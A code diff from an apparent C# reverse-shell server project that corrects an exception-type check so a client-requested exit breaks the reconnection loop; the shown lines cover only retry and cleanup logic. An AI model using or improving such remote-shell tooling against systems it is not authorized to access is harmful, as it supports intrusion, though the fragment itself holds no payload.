@@ -68,13 +68,13 @@ namespace ReverseShellServer
                         {
                             RunServer(connectionSettings.Item1, connectionSettings.Item2);
                         }
-                        catch (Exception)
+                        catch (Exception ex)
                         {
                             // Exceptions thrown trigger the network manager cleanup
                             Cleanup();
 
                             // The client asked to stop the connection, break from the connection loop
-                            if(typeof(Exception) == typeof(ExitException)) break;
+                            if(ex.GetType() == typeof(ExitException)) break;
 
                             connectionRetryCount--;
                         }
